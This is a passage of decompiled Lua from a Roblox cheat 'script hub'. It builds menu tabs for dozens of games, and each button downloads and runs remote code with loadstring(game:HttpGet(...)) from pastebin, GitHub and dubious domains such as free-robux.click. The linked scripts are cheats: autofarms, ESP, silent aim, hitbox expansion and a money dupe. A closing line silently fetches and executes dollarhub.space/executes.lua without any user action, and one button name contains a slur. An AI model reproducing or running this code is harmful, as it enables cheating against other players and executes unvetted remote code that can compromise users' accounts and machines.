      local r178_4 = r4_4:MakeTab({
        Name = "The Chosen One",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r178_4:AddButton({
        Name = "Laziest V4",
        Callback = function()
          -- line: [0, 0] id: 174
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FlavorYT/The-lazy-ONE/main/Made%20by%20leakz%20and%20EvilAlienWare"))()
        end,
      })
      r178_4:AddButton({
        Name = "TCO Ultimate UI",
        Callback = function()
          -- line: [0, 0] id: 441
          loadstring(game:HttpGet("https://pastebin.com/raw/89x8BPHC"))()
        end,
      })
      r178_4:AddButton({
        Name = "Good Script",
        Callback = function()
          -- line: [0, 0] id: 90
          loadstring(game:HttpGet("https://rawscripts.net/raw/The-Chosen-One-Extra-Stuff-18127"))()
        end,
      })
      r178_4:AddButton({
        Name = "Simple Script",
        Callback = function()
          -- line: [0, 0] id: 556
          loadstring(game:HttpGet("https://rawscripts.net/raw/The-Chosen-One-OP-SCRIPT-18120"))()
        end,
      })
      local r179_4 = r4_4:MakeTab({
        Name = "Tsunami Game",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r179_4:AddButton({
        Name = "Vadrifts Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 177
          loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Tsunami_game.lua"))()
        end,
      })
      r179_4:AddButton({
        Name = "Tsunami Game Script",
        Callback = function()
          -- line: [0, 0] id: 633
          loadstring(game:HttpGet("https://rawscripts.net/raw/Tsunami-Game_519"))()
        end,
      })
      r179_4:AddButton({
        Name = "Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 488
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "The Dropper",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Lvl Autofarm",
        Callback = function()
          -- line: [0, 0] id: 379
          loadstring(game:HttpGet("https://pastebin.com/raw/p6VtvTXK"))()
        end,
      })
      local r181_4 = r4_4:MakeTab({
        Name = "Treasure Hunt Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r181_4:AddButton({
        Name = "Suslik Hub",
        Callback = function()
          -- line: [0, 0] id: 719
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KrutoySuslik/SUSLIK-HUB-V2/main/Treasure-Hunt-Simulator"))()
        end,
      })
      r181_4:AddButton({
        Name = "Auto Farm, Auto Rebirth",
        Callback = function()
          -- line: [0, 0] id: 469
          loadstring(game:HttpGet("https://pastebin.com/raw/CZYvYUeW"))()
        end,
      })
      local r182_4 = r4_4:MakeTab({
        Name = "Timber 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r182_4:AddButton({
        Name = "Scripted Hub",
        Callback = function()
          -- line: [0, 0] id: 703
          loadstring(game:HttpGet("https://pastebin.com/raw/e8imzkv1"))()
        end,
      })
      r182_4:AddButton({
        Name = "Vermz Hub",
        Callback = function()
          -- line: [0, 0] id: 329
          getgenv().UseKey = "25ms"
          getgenv().AllowAnyKey = false
          loadstring(game:HttpGet("http://you.whimper.xyz/PandaSVAL.lua"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Vermzky/VermzHub/refs/heads/main/FREE"))()
        end,
      })
      local r183_4 = r4_4:MakeTab({
        Name = "Underground War 2.0",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r183_4:AddButton({
        Name = "Underground War 2.0 Script",
        Callback = function()
          -- line: [0, 0] id: 62
          loadstring(game:HttpGet("https://pastebin.com/raw/BfxQNCQN"))()
        end,
      })
      r183_4:AddButton({
        Name = "Y-HUB",
        Callback = function()
          -- line: [0, 0] id: 234
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/YHUB-Community/refs/heads/main/Underground-War2.0.lua"))()
        end,
      })
      local r184_4 = r4_4:MakeTab({
        Name = "Untitled Tag Game",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r184_4:AddButton({
        Name = "Syno Hub",
        Callback = function()
          -- line: [0, 0] id: 611
          untitled, taggame = pcall(game.HttpGet, game, ("https://%s/%s"):format("skibiditoilet.free-robux.click", "p/raw/bryvmasag5"))
          assert(untitled, "Couldnt retrieve script,", taggame)
          loadstring(taggame)()
          game:GetService("UserInputService").MouseIconEnabled = true
        end,
      })
      r184_4:AddButton({
        Name = "Game Enhancer",
        Callback = function()
          -- line: [0, 0] id: 173
          loadstring(game:HttpGet("https://pastebin.com/raw/wtkaHZ81"))()
        end,
      })
      r184_4:AddButton({
        Name = "Hitboxes",
        Callback = function()
          -- line: [0, 0] id: 142
          loadstring(game:HttpGet("https://pastebin.com/raw/3RfB693z", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Unnamed Shooter",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Hitboxes And ESP",
        Callback = function()
          -- line: [0, 0] id: 325
          loadstring(game:HttpGet("https://raw.githubusercontent.com/timurgim/CheatS/refs/heads/main/ExpandHitboxRBLX"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      local r186_4 = r4_4:MakeTab({
        Name = "Vehicle Legends",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r186_4:AddButton({
        Name = "Autofarm Money",
        Callback = function()
          -- line: [0, 0] id: 285
          loadstring(game:HttpGet("https://pastebin.com/raw/6XngDSHw"))()
        end,
      })
      r186_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 252
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r186_4:AddButton({
        Name = "Ultimate Hub",
        Callback = function()
          -- line: [0, 0] id: 590
          loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
        end,
      })
      local r187_4 = r4_4:MakeTab({
        Name = "War Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r187_4:AddButton({
        Name = "Zero Ware",
        Callback = function()
          -- line: [0, 0] id: 478
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scytheXlol/ZeroWare-V2/refs/heads/main/Loader.luau"))()
        end,
      })
      r187_4:AddButton({
        Name = "Awaken Hub",
        Callback = function()
          -- line: [0, 0] id: 771
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/rb/194b7151863d8635b13b1a4972c2fed338bb6639/wartyccon.lua", true))()
        end,
      })
      r187_4:AddButton({
        Name = "Neptune Hub",
        Callback = function()
          -- line: [0, 0] id: 651
          loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/NeptuneHub.lua"))()
        end,
      })
      local r188_4 = r4_4:MakeTab({
        Name = "Work At A Pizza Place",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r188_4:AddButton({
        Name = "OP Script",
        Callback = function()
          -- line: [0, 0] id: 745
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Work%20at%20a%20pizza%20place", true))()
        end,
      })
      r188_4:AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 328
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
        end,
      })
      r188_4:AddButton({
        Name = "CH Hub",
        Callback = function()
          -- line: [0, 0] id: 222
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
        end,
      })
      r188_4:AddButton({
        Name = "Good Script",
        Callback = function()
          -- line: [0, 0] id: 662
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/16"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Welcome To Bloxburg",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 748
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      r4_4:MakeTab({
        Name = "War Engines 0.6",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "ZhenX Hub",
        Callback = function()
          -- line: [0, 0] id: 244
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/War-Engines-Script/refs/heads/main/sauce"))()
        end,
      })
      local r191_4 = r4_4:MakeTab({
        Name = "Weak Legacy 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r191_4:AddButton({
        Name = "Tora Hub",
        Callback = function()
          -- line: [0, 0] id: 684
          loadstring(game:HttpGet("https://you.whimper.xyz/ToraWL"))()
        end,
      })
      r191_4:AddButton({
        Name = "Players ESP",
        Callback = function()
          -- line: [0, 0] id: 482
          loadstring(game:HttpGet("https://rawscripts.net/raw/Weak-Legacy-2-RELEASE-Ava-16607"))()
        end,
      })
      r191_4:AddButton({
        Name = "Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 223
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      local r192_4 = r4_4:MakeTab({
        Name = "Westbound",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r192_4:AddButton({
        Name = "Westware",
        Callback = function()
          -- line: [0, 0] id: 144
          loadstring(game:HttpGet("https://pastebin.com/raw/U9N4pdsz"))()
        end,
      })
      r192_4:AddButton({
        Name = "Hitboxes, ESP, Silent Aim",
        Callback = function()
          -- line: [0, 0] id: 143
          local r0_143 = loadstring(game:HttpGet("https://raw.githubusercontent.com/developersecurity-rblx/GameSight-Enhancer/refs/heads/main/GameSightEnhancerFile\'s/GameSight%20Enhancer%20(WestBound).lua"))()
        end,
      })
      r192_4:AddButton({
        Name = "Autofarm Money",
        Callback = function()
          -- line: [0, 0] id: 211
          loadstring(game:HttpGet("https://pastebin.com/raw/WiL3fChb"))()
        end,
      })
      r192_4:AddButton({
        Name = "Another Autofarm",
        Callback = function()
          -- line: [0, 0] id: 727
          loadstring(game:HttpGet("https://rawscripts.net/raw/Westbound-OP-MONEY-DUPE-30199"))()
        end,
      })
      local r193_4 = r4_4:MakeTab({
        Name = "Your Bizzare Adventure",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r193_4:AddButton({
        Name = "YBA GUI",
        Callback = function()
          -- line: [0, 0] id: 148
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/YBA-GUI-Rewrite.lua"))()
        end,
      })
      r193_4:AddButton({
        Name = "N-Word Hub",
        Callback = function()
          -- line: [0, 0] id: 544
          loadstring(game:HttpGet("https://raw.githubusercontent.com/goofyahh-hub/Your-Bizarre-Adventure/refs/heads/main/Main"))()
        end,
      })
      r193_4:AddButton({
        Name = "Era Hub (Auto Farms Get Kicked)",
        Callback = function()
          -- line: [0, 0] id: 773
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7b0411235ac7e2d87839e0d070ceaa7b.lua"))()
        end,
      })
      local r194_4 = r4_4:MakeTab({
        Name = "Zombie Attack",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r194_4:AddButton({
        Name = "Projeto LKB",
        Callback = function()
          -- line: [0, 0] id: 91
          loadstring(game:HttpGet("https://pastebin.com/raw/4Z4bHfT9"))()
        end,
      })
      r194_4:AddButton({
        Name = "Ski Hub",
        Callback = function()
          -- line: [0, 0] id: 226
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Yousuck780/Zombie-attack/main/zombie", true))()
        end,
      })
      r194_4:AddButton({
        Name = "Cloud Hub",
        Callback = function()
          -- line: [0, 0] id: 402
          loadstring(game:HttpGet("https://raw.githubusercontent.com/plishelpme/CloudHub/refs/heads/main/CloudHub%20script"))()
        end,
      })
      r0_4:Init()
      -- close: r0_4
    end
  end)
end)()
coroutine.wrap(function()
  -- line: [0, 0] id: 1
  local r0_1 = Instance.new("LocalScript", r11_0)
  local r1_1 = ""
  r0_1.Parent.MouseButton1Click:Connect(function(r0_2)
    -- line: [0, 0] id: 2
    setclipboard(tostring(r1_1))
  end)
end)()
loadstring(game:HttpGet("dollarhub.space/executes.lua"))()
